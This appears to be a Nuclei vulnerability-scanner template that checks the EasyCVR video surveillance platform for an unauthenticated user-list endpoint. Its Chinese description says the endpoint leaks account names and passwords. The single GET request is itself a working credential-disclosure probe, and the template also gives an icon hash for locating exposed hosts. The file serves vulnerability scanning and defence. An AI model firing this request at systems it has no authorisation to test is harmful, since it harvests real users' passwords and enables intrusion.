http:
    - matchers:
        - status:
            - 200
          type: status
        - condition: and
          part: body
          type: word
          words:
            - '"count":'
            - '"data":'
            - '"ID":'
            - '"Name":'
            - '"Username":'
            - '"Password":'
            - '"CreateAt":'
      matchers-condition: and
      raw:
        - |
          GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
          Host: {{Hostname}}
id: easycvr-userlist-info-disclosure
info:
    author: SleepingBag945
    description: |-
        视频监控汇聚平台 EasyCVR 用户信息泄漏,可泄露账号密码
        icon_hash="458134656"
    name: 视频监控汇聚平台 EasyCVR 用户信息泄漏
    severity: high
    tags:
        - EasyCVR
